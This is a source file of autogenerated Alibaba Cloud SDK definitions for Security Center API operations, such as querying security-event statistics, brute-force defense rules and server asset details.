async function describeAllImageBaseline(request: DescribeAllImageBaselineRequest): DescribeAllImageBaselineResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllImageBaselineWithOptions(request, runtime);
}

model DescribeAllRegionsStatisticsRequest {
  from?: string(name='From', description='The source of the request. Default value: **aqs**. Valid values:

*   **sas**: Security Center.
*   **aqs**: Server Guard.', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group that you want to query.

>  You can call the [DescribeAllGroups](https://help.aliyun.com/document_detail/130972.html) operation to query the ID.', example='1161****'),
  remark?: string(name='Remark', description='The name or public IP address of the asset.', example='192.168.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='33.80.XXX.XXX'),
}

model DescribeAllRegionsStatisticsResponseBody = {
  data?: {
    account?: int32(name='Account', description='The number of logons to the asset.', example='0'),
    health?: int32(name='Health', description='The total number of unfixed baseline risks.', example='2'),
    newSuspicious?: int32(name='NewSuspicious', description='The number of alerts that are generated by Server Guard or Security Center.

> 

*   If **From** is set to **sas**, this parameter indicates the number of alerts that are generated by Security Center.

*   If **From** is set to **aqs**, this parameter indicates the number of alerts that are generated by Server Guard.', example='0'),
    suspicious?: int32(name='Suspicious', description='The number of alerts that are generated by Server Guard.', example='2'),
    trojan?: int32(name='Trojan', description='The number of webshell alerts.', example='1'),
    vul?: int32(name='Vul', description='The number of unfixed vulnerabilities.', example='17'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='B9A68671-BD84-55CD-807A-BA3A5490FCB4'),
}

model DescribeAllRegionsStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAllRegionsStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on global security events, including the numbers of unfixed vulnerabilities, baseline risks, and alerts.
 *
 * @param request DescribeAllRegionsStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAllRegionsStatisticsResponse
 */
async function describeAllRegionsStatisticsWithOptions(request: DescribeAllRegionsStatisticsRequest, runtime: Util.RuntimeOptions): DescribeAllRegionsStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAllRegionsStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on global security events, including the numbers of unfixed vulnerabilities, baseline risks, and alerts.
 *
 * @param request DescribeAllRegionsStatisticsRequest
 * @return DescribeAllRegionsStatisticsResponse
 */
async function describeAllRegionsStatistics(request: DescribeAllRegionsStatisticsRequest): DescribeAllRegionsStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAllRegionsStatisticsWithOptions(request, runtime);
}

model DescribeAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  id?: long(name='Id', description='The ID of the defense rule.

> You can call the [DescribeAntiBruteForceRules](~~DescribeAntiBruteForceRules~~) operation to query the IDs of defense rules.', example='1141****'),
  name?: string(name='Name', description='The name of the rule.', example='testName'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page.', example='10'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.69.XX.XX'),
}

model DescribeAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  rules?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp when the rule was created. Unit: milliseconds.', example='1669800181000'),
      defaultRule?: boolean(name='DefaultRule', description='Indicates whether the defense rule is the default rule. Valid values:

*   **true**: The defense rule is the default rule.
*   **false**: The defense rule is not the default rule.

> The default rule takes effect on all servers that are not protected by defense rules against brute-force attacks.', example='true'),
      enableSmartRule?: boolean(name='EnableSmartRule', description='This parameter is deprecated.', example='false'),
      failCount?: int32(name='FailCount', description='The threshold of logon failures that is specified in the defense rule.', example='15'),
      forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes.', example='360'),
      id?: long(name='Id', description='The ID of the defense rule.', example='1629'),
      machineCount?: int32(name='MachineCount', description='The number of servers to which the defense rule is applied.', example='3'),
      name?: string(name='Name', description='The name of the defense rule.', example='AntiBruteForceRule01'),
      span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. If **Span** is set to 10, the defense rule takes effect when the logon failures measured within 10 minutes reaches the specified threshold. The IP address of attackers cannot be used to log on to the server in the specified period of time.', example='10'),
      uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of servers to which the defense rule is applied.'),
    }
  ](name='Rules', description='An array that consists of the details of the defense rule.'),
}

model DescribeAntiBruteForceRulesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAntiBruteForceRulesResponseBody(name='body'),
}

/**
 * @summary Queries created defense rules against brute-force attacks.
 *
 * @param request DescribeAntiBruteForceRulesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAntiBruteForceRulesResponse
 */
async function describeAntiBruteForceRulesWithOptions(request: DescribeAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries created defense rules against brute-force attacks.
 *
 * @param request DescribeAntiBruteForceRulesRequest
 * @return DescribeAntiBruteForceRulesResponse
 */
async function describeAntiBruteForceRules(request: DescribeAntiBruteForceRulesRequest): DescribeAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeAppVulScanCycleResponseBody = {
  cycle?: string(name='Cycle', description='The scan cycle for application vulnerabilities.

*   1week
*   2weeks
*   3days', example='1week'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='934E6D2A-0123-5A99-88BA-80DC27634E22'),
}

model DescribeAppVulScanCycleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAppVulScanCycleResponseBody(name='body'),
}

/**
 * @summary Queries the scan cycle for application vulnerabilities.
 *
 * @param request DescribeAppVulScanCycleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAppVulScanCycleResponse
 */
async function describeAppVulScanCycleWithOptions(runtime: Util.RuntimeOptions): DescribeAppVulScanCycleResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the scan cycle for application vulnerabilities.
 *
 * @return DescribeAppVulScanCycleResponse
 */
async function describeAppVulScanCycle(): DescribeAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAppVulScanCycleWithOptions(runtime);
}

model DescribeAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
}

model DescribeAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS database
*   **4**: ApsaraDB for MongoDB database
*   **5**: ApsaraDB for Redis database
*   **6**: image
*   **7**: container', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition', example='7'),
    bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
    clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent suspends protection for your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='online'),
    clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The number of CPU cores.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='1603863599000'),
    diskInfoList?: [ string ](name='DiskInfoList', description='An array that consists of the information about the disk.'),
    flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: yes
*   **1**: no', example='0'),
    groupTrace?: string(name='GroupTrace', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='default'),
    hostName?: string(name='HostName', description='The name of the host.', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='192.168.XX.XX'),
    ipList?: [ string ](name='IpList', description='The IP addresses of the server.'),
    kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList', description='The media access control (MAC) addresses of the server.'),
    mem?: int32(name='Mem', description='The memory size of the server. Unit: GB.', example='32'),
    memory?: long(name='Memory', description='The memory size of the server. Unit: MB.', example='512'),
    os?: string(name='Os', description='The operating system type of the server.', example='linux'),
    osDetail?: string(name='OsDetail', description='The operating system version of the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The name of the operating system.', example='-'),
    region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou-dg-a01'),
    regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The operating system information about the server.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The tag that is added to the server.', example='InternetIp'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The details of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39031E31-6BBA-5C99-A870-D807E78918CD'),
}

model DescribeAssetDetailByUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAssetDetailByUuidResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI DescribeAssetDetailByUuid is deprecated, please use Sas::2018-12-03::GetAssetDetailByUuid instead.
 *
 * @summary Queries the details of a server and the extended information about the server by using the UUID of the server.
 *
 * @description This operation will be discontinued soon. You must call the [GetAssetDetailByUuid](~~GetAssetDetailByUuid~~) operation to query the details of the server.
 *
 * @param request DescribeAssetDetailByUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAssetDetailByUuidResponse
 */
// Deprecated
async function describeAssetDetailByUuidWithOptions(request: DescribeAssetDetailByUuidRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeAssetDetailByUuid is deprecated, please use Sas::2018-12-03::GetAssetDetailByUuid instead.
 *
 * @summary Queries the details of a server and the extended information about the server by using the UUID of the server.
 *
 * @description This operation will be discontinued soon. You must call the [GetAssetDetailByUuid](~~GetAssetDetailByUuid~~) operation to query the details of the server.
 *
 * @param request DescribeAssetDetailByUuidRequest
 * @return DescribeAssetDetailByUuidResponse
 */
// Deprecated
async function describeAssetDetailByUuid(request: DescribeAssetDetailByUuidRequest): DescribeAssetDetailByUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidWithOptions(request, runtime);
}

model DescribeAssetDetailByUuidsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the IDs of Alibaba Cloud accounts.', example='127608589417****'),
  uuids?: string(name='Uuids', description='The UUIDs of the instances. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of instances.

This parameter is required.', example='0687b17f-2a36-4e5****,0687b17f-2a36-4e****'),
}

model DescribeAssetDetailByUuidsResponseBody = {
  assetList?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset.

The value is fixed as **0**, which indicates ECS instances.', example='0'),
      authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the instance. Unit: milliseconds.', example='1627974044000'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the instance. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition', example='7'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the instance. Valid values:

*   **true**
*   **false**', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **online**
*   **offline**', example='online'),
      clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
      cpu?: int32(name='Cpu', description='The number of CPU cores.', example='4'),
      cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
      createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the instance. Unit: milliseconds.', example='1603863599000'),
      diskInfoList?: [ string ](name='DiskInfoList', description='An array that consists of the information about the disk.'),
      flag?: int32(name='Flag', description='The type of the asset by source. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: light-weight assets.', example='0'),
      groupTrace?: string(name='GroupTrace', description='The group to which the instance belongs. By default, the instances that are not grouped belong to the **Default** group.', example='default'),
      hostName?: string(name='HostName', description='The hostname.', example='test'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-rj9gda4wolo0zixi****'),
      instanceName?: string(name='InstanceName', description='The name of the ECS instance.', example='TestInstanceName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the ECS instance.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the ECS instance.', example='192.168.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the ECS instance.

>  If the ECS instance has a public IP address, the value of this parameter is the public IP address of the ECS instance. If the ECS instance does not have a public IP address, the value of this parameter is the private IP address of the ECS instance.', example='10.10.XX.XX'),
      ipList?: [ string ](name='IpList', description='The IP addresses of the instances.'),
      kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
      macList?: [ string ](name='MacList', description='The media access control (MAC) addresses of the instances.'),
      mem?: int32(name='Mem', description='The memory size of the instance. Unit: GB.', example='4'),
      memory?: long(name='Memory', description='The memory size of the instance. Unit: MB.', example='1024'),
      os?: string(name='Os', description='The operating system of the ECS instance.', example='Linux'),
      osDetail?: string(name='OsDetail', description='The operating system version of the instance.', example='Linux 64bit'),
      osName?: string(name='OsName', description='The name of the operating system run by the ECS instance.', example='CentOS 7.6 64-bit'),
      region?: string(name='Region', description='The region in which the ECS instance resides.', example='cn-guangzhou'),
      regionId?: string(name='RegionId', description='The region in which the ECS instance resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-shanghai'),
      regionName?: string(name='RegionName', description='The name of the region in which the ECS instance resides.', example='cn-shenzhen'),
      sysInfo?: string(name='SysInfo', description='The operating system information about the instance.', example='CentOS Linux 8.0.1905'),
      tag?: string(name='Tag', description='The tag added to the instance.', example='test'),
      uuid?: string(name='Uuid', description='The UUID of the ECS instance.', example='2a98f149-0256-414c-a29a-a69f8a75****'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC).', example='13231-331331'),
    }
  ](name='AssetList', description='An array that consists of the details of the instances.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='92016EC8-D52D-49D8-9FF7-9EA340A950B9'),
}

model DescribeAssetDetailByUuidsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAssetDetailByUuidsResponseBody(name='body'),
}

/**
 * @summary Queries the details of Elastic Compute Service (ECS) instances.
 *
 * @param request DescribeAssetDetailByUuidsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAssetDetailByUuidsResponse
 */
async function describeAssetDetailByUuidsWithOptions(request: DescribeAssetDetailByUuidsRequest, runtime: Util.RuntimeOptions): DescribeAssetDetailByUuidsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetDetailByUuids',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of Elastic Compute Service (ECS) instances.
 *
 * @param request DescribeAssetDetailByUuidsRequest
 * @return DescribeAssetDetailByUuidsResponse
 */
async function describeAssetDetailByUuids(request: DescribeAssetDetailByUuidsRequest): DescribeAssetDetailByUuidsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetDetailByUuidsWithOptions(request, runtime);
}

model DescribeAssetSummaryResponseBody = {
  assetsSummary?: {
    totalAssetAllRegion?: int32(name='TotalAssetAllRegion', description='The total number of protected assets in all regions.

>  Security Center supports the Hangzhou and Singapore service centers, which separately correspond to the China and Outside China data management centers. In the Hangzhou service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the China data management center. In the Singapore service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the Outside China data management center. You can determine whether the current region is covered by the China data management center or by the Outside China data management center based on the endpoint of Security Center. For more information about the supported regions for each data management center, see [What is Security Center?](https://help.aliyun.com/document_detail/42302.html)', example='2064'),
    totalCoreAllRegion?: int32(name='TotalCoreAllRegion', description='The total number of cores of protected assets in all regions.

>  Security Center supports the Hangzhou and Singapore service centers, which separately correspond to the China and Outside China data management centers. In the Hangzhou service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the China data management center. In the Singapore service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the Outside China data management center. You can determine whether the current region is covered by the China data management center or by the Outside China data management center based on the endpoint of Security Center. For more information about the supported regions for each data management center, see [What is Security Center?](https://help.aliyun.com/document_detail/42302.html)', example='3200'),
    totalCoreNum?: int32(name='TotalCoreNum', description='The total number of cores of protected assets in the current region.

>  Security Center supports the Hangzhou and Singapore service centers, which separately correspond to the China and Outside China data management centers. In the Hangzhou service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the China data management center. In the Singapore service center, Security Center provides protection capabilities for assets that are deployed in the regions covered by the Outside China data management center. You can determine whether the current region is covered by the China data management center or by the Outside China data management center based on the endpoint of Security Center. For more information about the supported regions for each data management center, see [What is Security Center?](https://help.aliyun.com/document_detail/42302.html)', example='1022'),
  }(name='AssetsSummary', description='The statistical information about the assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0FA7F1F4-488D-52CA-9BFC-3E47793B49D1'),
}

model DescribeAssetSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAssetSummaryResponseBody(name='body'),
}

/**
 * @summary The ID of the request, which is used to locate and troubleshoot issues.
 *
 * @param request DescribeAssetSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAssetSummaryResponse
 */
async function describeAssetSummaryWithOptions(runtime: Util.RuntimeOptions): DescribeAssetSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeAssetSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary The ID of the request, which is used to locate and troubleshoot issues.
 *
 * @return DescribeAssetSummaryResponse
 */
async function describeAssetSummary(): DescribeAssetSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetSummaryWithOptions(runtime);
}

model DescribeAssetsScaProcessNumRequest {
  bizType?: string(name='BizType', description='The type of the application process. Default value: java. Valid values:

*   **java**
*   **php**', example='java'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

This parameter is required.'),
}

model DescribeAssetsScaProcessNumResponseBody = {
  data?: [ 
    {
      count?: int32(name='Count', description='The number of Java processes.

>  If no processes exist on the asset, no statistical result is returned.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the asset.

>  If no processes exist on the asset, no statistical result is returned.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The statistical results.'),
  requestId?: string(name='RequestId', description='The request ID.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAssetsScaProcessNumResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeAssetsScaProcessNumResponseBody(name='body'),
}

/**
 * @summary Queries the number of Java processes in an asset by using the asset fingerprints feature of Security Center.
 *
 * @param request DescribeAssetsScaProcessNumRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeAssetsScaProcessNumResponse
 */
async function describeAssetsScaProcessNumWithOptions(request: DescribeAssetsScaProcessNumRequest, runtime: Util.RuntimeOptions): DescribeAssetsScaProcessNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAssetsScaProcessNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of Java processes in an asset by using the asset fingerprints feature of Security Center.
 *
 * @param request DescribeAssetsScaProcessNumRequest
 * @return DescribeAssetsScaProcessNumResponse
 */
async function describeAssetsScaProcessNum(request: DescribeAssetsScaProcessNumRequest): DescribeAssetsScaProcessNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAssetsScaProcessNumWithOptions(request, runtime);
}

model DescribeAssetsSecurityEventSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='cc58f827d893f4d7fb3e34b5d4395****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query on containers. Valid values:

*   **instanceId**: the ID of the container instance
*   **clusterId**: the ID of the cluster
*   **regionId**: the region ID of the container
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image repository
*   **imageDigest**: the digest of the image
*   **ClusterType**: the type of the cluster
*   **hostIp**: the public IP address
*   **pod**: the pod
*   **podIp**: the IP address of the pod
*   **containerId**: the ID of the container
*   **vulStatus**: whether vulnerabilities are detected on the container
*   **alarmStatus**: whether alerts are generated for the container
*   **riskStatus**: whether risks are detected on the container
*   **riskLevel**: the risk level of the container
*   **containerScope**: the type of the container', example='clusterName'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query on containers.', example='arms-prom-operator'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.108.XX.XX'),
}

model DescribeAssetsSecurityEventSummaryResponseBody = {
  assets?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **namespace**
*   **clusters**
*   **applications**
*   **pods**
*   **containers**
*   **images**
*   **hosts**', example='namespace'),
      riskCount?: long(name='RiskCount', description='The number of potential risky assets.', example='16'),
      totalCount?: long(name='TotalCount', description='The total number of assets.', example='30'),
    }
  ](name='Assets', description='An array that consists of risk information about containers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

